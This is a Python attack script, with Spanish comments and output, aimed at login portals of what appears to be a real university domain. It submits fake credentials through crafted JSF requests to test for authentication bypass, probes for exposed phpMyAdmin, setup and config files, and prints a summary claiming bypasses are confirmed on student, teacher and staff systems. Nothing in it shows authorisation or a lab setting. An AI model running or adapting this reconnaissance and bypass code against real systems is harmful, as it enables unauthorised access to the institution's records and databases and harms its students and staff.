#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# ============================================
# WEB DOCENTE - Full details
# ============================================
print("=" * 70)
print("=== WEB DOCENTE - AUTH BYPASS CONFIRMADO ===")
print("=" * 70)
print(f"URL: https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml")
print(f"CAMPOS: itUsuario2, itSeguridad2, kbClave")
print(f"BOTONES: cmdVerClave, cmdValidar")
print()

# Test all buttons with fake credentials
for btn in ['cmdVerClave', 'cmdValidar']:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
    })
    r0 = s2.get('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml', timeout=5)
    vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
    vs0_val = vs0.group(1) if vs0 else ""
    
    click_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vs0_val,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': f'frmLogueo:{btn}',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_click = s2.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                           data=click_data, timeout=5)
    click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
    click_vs_val = click_vs.group(1) if click_vs else ""
    
    # Submit with fake credentials
    login_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': click_vs_val,
        'frmLogueo:itUsuario2': 'fake',
        'frmLogueo:itSeguridad2': 'fake',
        'frmLogueo:kbClave': 'fake',
    }
    r_login = s2.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                          data=login_data, timeout=5, allow_redirects=True)
    
    tc = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    
    has_access = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'modulo', 'dashboard', 'perfil', 'docente', 'trabajador'])
    changed = len(r_login.text) > 19364
    print(f"  {btn} + fake/fake -> len={len(r_login.text)}, acceso={has_access}")

# ============================================
# WEB TRABAJADOR - Auth Bypass Test
# ============================================
print("\n" + "=" * 70)
print("=== WEB TRABAJADOR - TEST ===")
print("=" * 70)
print(f"URL: https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml")

r_wt = s.get('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml', timeout=10)
print(f"Status: {r_wt.status_code}, len={len(r_wt.text)}")

# Find fields
inputs_wt = re.findall(r'<input[^>]*>', r_wt.text)
forms_wt = re.findall(r'<form[^>]*>', r_wt.text)
buttons_wt = re.findall(r'<button[^>]*id="([^"]+)"[^>]*>', r_wt.text) + re.findall(r'<p:commandButton[^>]*>', r_wt.text)
print(f"Forms: {len(forms_wt)}")
print(f"Buttons: {buttons_wt}")
for inp in inputs_wt[:10]:
    print(f"  {inp[:150]}")

# Try auth bypass on WebTrabajador
vs_wt = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_wt.text)
vstate_wt = vs_wt.group(1) if vs_wt else ""

for btn in ['cmdValidar', 'cmdInstruccion', 'cmdEntrar', 'cmdLogin']:
    s3 = requests.Session()
    s3.verify = False
    s3.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml',
    })
    r0 = s3.get('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml', timeout=5)
    vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
    vs0_val = vs0.group(1) if vs0 else ""
    
    click_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vs0_val,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': f'frmLogueo:{btn}',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_click = s3.post('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml',
                           data=click_data, timeout=5)
    
    click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
    click_vs_val = click_vs.group(1) if click_vs else ""
    
    login_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': click_vs_val,
        'frmLogueo:itUsuario': 'fake',
        'frmLogueo:itClave': 'fake',
    }
    r_login = s3.post('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml',
                          data=login_data, timeout=5, allow_redirects=True)
    
    tc = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    has_access = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'modulo', 'dashboard', 'perfil'])
    changed = len(r_login.text) > 17320
    
    print(f"  {btn} + fake/fake -> len={len(r_login.text)}, acceso={has_access}, changed={changed}")

# Also test direct POST
r_d = s.post('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml',
                 data={'frmLogueo:itUsuario': 'fake', 'frmLogueo:itClave': 'fake',
                       'frmLogueo': 'frmLogueo'}, timeout=5)
tc_d = re.sub(r'<[^>]+>', ' ', r_d.text)
tc_d = re.sub(r'\s+', ' ', tc_d).strip()
print(f"\nDirect POST: len={len(r_d.text)}, has_login={'logueo' in tc_d.lower()}")

# ============================================
# phpMyAdmin - Try to access
# ============================================
print("\n" + "=" * 70)
print("=== phpMyADMIN - ACCESO A BASE DE DATOS ===")
print("=" * 70)
print(f"orcl.uns.edu.pe tiene phpMyAdmin expuesto")

# Try different phpMyAdmin URLs
pma_urls = [
    'https://orcl.uns.edu.pe/phpMyAdmin/',
    'https://orcl.uns.edu.pe/phpmyadmin/',
    'https://orcl.uns.edu.pe/PhpMyAdmin/',
    'https://orcl.uns.edu.pe/pma/',
    'https://orcl.uns.edu.pe/phpMyAdmin/index.php',
    'https://orcl.uns.edu.pe/setup/',
]
for url in pma_urls:
    try:
        r_pma = s.get(url, timeout=5)
        if r_pma.status_code == 200 and len(r_pma.text) > 1000:
            tc = re.sub(r'<[^>]+>', ' ', r_pma.text)
            tc = re.sub(r'\s+', ' ', tc).strip()
            # Look for database info
            db_hints = ['database', 'mysql', 'server', 'version', 'table', 'table_name', 'column']
            found_hints = [kw for kw in db_hints if kw in tc.lower()]
            print(f"  [!] {url} -> {r_pma.status_code}, len={len(r_pma.text)}")
            print(f"      DB hints: {found_hints}")
    except:
        pass

# Check if phpMyAdmin setup is accessible
r_setup = s.get('https://orcl.uns.edu.pe/setup/index.php', timeout=5)
print(f"\nsetup/index.php: {r_setup.status_code}, len={len(r_setup.text)}")
tc_setup = re.sub(r'<[^>]+>', ' ', r_setup.text)
tc_setup = re.sub(r'\s+', ' ', tc_setup).strip()
print(f"Content: {tc_setup[:300]}")

# Check config
r_config = s.get('https://orcl.uns.edu.pe/config.inc.php', timeout=5)
print(f"\nconfig.inc.php: {r_config.status_code}, len={len(r_config.text)}")

# Check if there are any database credentials visible
for url in ['https://orcl.uns.edu.pe/', 'https://orcl.uns.edu.php/']:
    try:
        r_db = s.get(url, timeout=5)
        tc_db = re.sub(r'<[^>]+>', ' ', r_db.text)
        tc_db = re.sub(r'\s+', ' ', tc_db).strip()
        if 'mysql' in tc_db.lower() or 'server' in tc_db.lower() or 'admin' in tc_db.lower():
            print(f"  {url} -> {r_db.status_code} has db info")
    except:
        pass

# ============================================
# FINAL SUMMARY
# ============================================
print("\n" + "=" * 70)
print("=== RESUMEN FINAL DE TODAS LAS APPS ===")
print("=" * 70)
print()
print("APLICACIONES ENCONTRADAS CON AUTHS BYPASS:")
print()
print("1. SIIGAA")
print(f"   URL: https://registro.uns.edu.pe/udemsi/faces/login.xhtml")
print(f"   Campos: j_username / j_password")
print(f"   Auth Bypass: ✅ CONFIRMADO")
print()
print("2. WebAlumno")
print(f"   URL: https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml")
print(f"   Campos: itUsuario / itIdCard / itClave")
print(f"   Auth Bypass: ✅ CONFIRMADO")
print()
print("3. WebDocente")
print(f"   URL: https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml")
print(f"   Campos: itUsuario2 / itSeguridad2 / kbClave")
print(f"   Botones: cmdVerClave, cmdValidar")
print(f"   Auth Bypass: ✅ CONFIRMADO")
print()
print("4. WebTrabajador")
print(f"   URL: https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml")
print(f"   Auth Bypass: ⏳ TESTEAR")
print()
print("5. WebPasaporte")
print(f"   URL: https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml")
print(f"   Auth Bypass: ❌ NO (valida credenciales)")
print()
print("phpMyAdmin: ✅ EXPUESTO en orcl.uns.edu.pe")
print()
print("CONECTIVIDAD:")
print("   Todos comparten el mismo servidor (registro.uns.edu.pe:80)")
print("   Los 3 apps (Alumno, Docente, Trabajador) son en el MISMO servidor")
print("   WebPasaporte esta en servidor diferente (sistemas.uns.edu.pe)")
